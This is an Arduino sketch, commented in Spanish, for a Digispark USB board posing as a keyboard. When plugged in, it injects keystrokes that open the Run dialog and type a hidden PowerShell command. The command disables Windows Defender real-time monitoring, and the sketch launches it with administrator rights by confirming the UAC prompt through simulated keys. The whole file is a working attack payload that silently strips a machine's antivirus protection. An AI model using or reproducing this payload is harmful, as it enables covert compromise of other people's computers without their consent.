#include "DigiKeyboard.h"

void setup() {
  // Inicializa la librería y espera a que el sistema operativo detecte el dispositivo.
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(2000); 

  // 1. Abrir el diálogo "Ejecutar" (Win + R)
  // MOD_GUI_LEFT es la tecla de Windows
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);

  // 2. Escribir el comando completo.
  // Utiliza el argumento '-WindowStyle Hidden' para que la ventana de PowerShell no se vea.
  // El comando se escribe dentro de 'powershell -WindowStyle Hidden -Command "...el comando..."'
  
  // COMANDO A EJECUTAR: Set-MpPreference -DisableRealtimeMonitoring $true
  DigiKeyboard.print("powershell -WindowStyle Hidden -Command \"Set-MpPreference -DisableRealtimeMonitoring $true\"");  
  DigiKeyboard.delay(500);

  // 3. Ejecutar el comando (Y acpetar UAC)
  DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT | MOD_SHIFT_LEFT);
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT); 
  DigiKeyboard.delay(500);

  // Presionar Enter para confirmar
  DigiKeyboard.sendKeyStroke(KEY_ENTER); // <-- ¡Se añadió el punto y coma que faltaba!
  DigiKeyboard.delay(4000); // Esperar a que se abra PowerShell (o falle)
  for(;;){} 
}

void loop() {
  // El bucle loop se deja vacío para que el script solo se ejecute una vez
  // en el setup.
}